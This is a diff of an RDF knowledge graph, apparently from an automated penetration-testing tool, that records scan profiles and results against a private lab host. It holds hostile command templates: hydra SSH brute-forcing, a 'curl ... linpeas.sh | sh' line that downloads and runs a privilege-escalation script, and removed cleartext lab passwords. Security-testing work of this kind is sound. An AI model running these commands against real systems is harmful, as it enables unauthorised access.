@@ -6,9 +6,11 @@ ns2:IpAddress1 a ns2:IpAddress ;
     ns2:addressPort ns2:Port1 ;
     ns2:ipv4 "192.168.0.102" .
 
-ns2:Profile1 a ns1:Profile ;
-    ns2:profileName "full_scan",
-        "ssh_attack" .
+ns2:Scan2 a ns2:Scan ;
+    ns2:command "b'nmap -F 192.168.0.102'" ;
+    ns2:executionTime "16:56 08/04/2023" ;
+    ns2:resultScore 9.421756e+00 ;
+    ns2:scanProfile ns1:Profile5 .
 
 ns1:Profile1 a ns1:Profile ;
     ns1:Command "gobuster dir -u http://<ip>:<port>/ -w wordlists/common.txt" ;
@@ -70,20 +72,6 @@ ns1:Profile4 a ns1:Profile ;
     ns1:hasResult ns1:Result1 ;
     ns1:profileName "https_dir_scan_big" .
 
-ns1:Profile5 a ns1:Profile ;
-    ns1:Command "nmap -F <ip>" ;
-    ns1:hasRequirement ns1:Requirement1 ;
-    ns1:hasResult ns1:Result2,
-        ns1:Result3 ;
-    ns1:profileName "fast_scan" .
-
-ns1:Profile6 a ns1:Profile ;
-    ns1:Command "nmap -sC -sV -p- <ip>" ;
-    ns1:hasRequirement ns1:Requirement1 ;
-    ns1:hasResult ns1:Result2,
-        ns1:Result3 ;
-    ns1:profileName "full_scan" .
-
 ns1:Profile7 a ns1:Profile ;
     ns1:Command "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh" ;
     ns1:hasRequirement ns1:Requirement6 ;
@@ -130,61 +118,29 @@ ns1:Tool7 a ns1:Tool ;
     ns1:toolName "hydra" ;
     ns1:version "" .
 
-ns2:Account1 a ns2:Account ;
-    ns2:accountPassword ns2:Password1 ;
-    ns2:accountUsername "client" ;
-    ns2:scanInfo ns2:Scan2,
-        ns2:Scan3,
-        ns2:Scan4,
-        ns2:Scan5,
-        ns2:Scan6 .
-
-ns2:Account2 a ns2:Account ;
-    ns2:accountPassword ns2:Password2 ;
-    ns2:accountUsername "manager" ;
-    ns2:scanInfo ns2:Scan2,
-        ns2:Scan3,
-        ns2:Scan4,
-        ns2:Scan5,
-        ns2:Scan6 .
-
-ns2:Password1 a ns2:Password ;
-    ns2:passwordCleartext "devpass" ;
-    ns2:scanInfo ns2:Scan2,
-        ns2:Scan3,
-        ns2:Scan4,
-        ns2:Scan5,
-        ns2:Scan6 .
-
-ns2:Password2 a ns2:Password ;
-    ns2:passwordCleartext "password1" ;
-    ns2:scanInfo ns2:Scan2,
-        ns2:Scan3,
-        ns2:Scan4,
-        ns2:Scan5,
-        ns2:Scan6 .
-
 ns2:Port1 a ns2:Port ;
     ns2:portNumber "22" ;
     ns2:portService ns2:Service1 ;
     ns2:portStatus "open" ;
-    ns2:scanInfo ns2:Scan1,
-        ns2:Scan2,
-        ns2:Scan3,
-        ns2:Scan4,
-        ns2:Scan5,
-        ns2:Scan6 .
+    ns2:scanInfo ns2:Scan1 .
 
 ns2:Service1 a ns2:Service ;
-    ns2:scanInfo ns2:Scan1,
-        ns2:Scan2,
-        ns2:Scan3,
-        ns2:Scan4,
-        ns2:Scan5,
-        ns2:Scan6 ;
-    ns2:serviceAccount ns2:Account1,
-        ns2:Account2 ;
+    ns2:scanInfo ns2:Scan1 ;
     ns2:serviceName "ssh" .
+
+ns1:Profile5 a ns1:Profile ;
+    ns1:Command "nmap -F <ip>" ;
+    ns1:hasRequirement ns1:Requirement1 ;
+    ns1:hasResult ns1:Result2,
+        ns1:Result3 ;
+    ns1:profileName "fast_scan" .
+
+ns1:Profile6 a ns1:Profile ;
+    ns1:Command "nmap -sC -sV -p- <ip>" ;
+    ns1:hasRequirement ns1:Requirement1 ;
+    ns1:hasResult ns1:Result2,
+        ns1:Result3 ;
+    ns1:profileName "full_scan" .
 
 ns1:Requirement10 a ns1:Requirement ;
     ns1:requirement "password" ;
@@ -219,7 +175,7 @@ ns1:Requirement5 a ns1:Requirement ;
     ns1:value "['Ip', 'Port', 'https']" .
 
 ns1:Requirement6 a ns1:Requirement ;
-    ns1:requirement "shell" ;
+    ns1:requirement "connection" ;
     ns1:value "connection" .
 
 ns1:Requirement7 a ns1:Requirement ;
@@ -242,8 +198,9 @@ ns1:Result6 a ns1:Result ;
 
 ns2:Scan1 a ns2:Scan ;
     ns2:command "b'nmap -sC -sV -p- 192.168.0.102'" ;
-    ns2:executionTime "14:36 08/04/2023" ;
-    ns2:resultScore 1.066893e+00 .
+    ns2:executionTime "16:56 08/04/2023" ;
+    ns2:resultScore 1.090918e+00 ;
+    ns2:scanProfile ns1:Profile6 .
 
 ns1:Result2 a ns1:Result ;
     ns1:result "port" .
@@ -259,31 +216,6 @@ ns1:Result1 a ns1:Result ;
 
 ns1:Result5 a ns1:Result ;
     ns1:result "password" .
-
-ns2:Scan2 a ns2:Scan ;
-    ns2:command "b'hydra -C wordlists/default_credentials/test.txt ssh://192.168.0.102:22'" ;
-    ns2:executionTime "14:36 08/04/2023" ;
-    ns2:resultScore 3.51875e+00 .
-
-ns2:Scan3 a ns2:Scan ;
-    ns2:command "b'hydra -C wordlists/default_credentials/test.txt ssh://192.168.0.102:22'" ;
-    ns2:executionTime "14:36 08/04/2023" ;
-    ns2:resultScore 3.469142e+00 .
-
-ns2:Scan4 a ns2:Scan ;
-    ns2:command "b'hydra -C wordlists/default_credentials/test.txt ssh://192.168.0.102:22'" ;
-    ns2:executionTime "14:36 08/04/2023" ;
-    ns2:resultScore 3.490926e+00 .
-
-ns2:Scan5 a ns2:Scan ;
-    ns2:command "b'hydra -C wordlists/default_credentials/test.txt ssh://192.168.0.102:22'" ;
-    ns2:executionTime "14:36 08/04/2023" ;
-    ns2:resultScore 3.475785e+00 .
-
-ns2:Scan6 a ns2:Scan ;
-    ns2:command "b'hydra -C wordlists/default_credentials/test.txt ssh://192.168.0.102:22'" ;
-    ns2:executionTime "15:10 08/04/2023" ;
-    ns2:resultScore 3.464966e+00 .
 
 ns1:Requirement1 a ns1:Requirement ;
     ns1:requirement "ip" ;
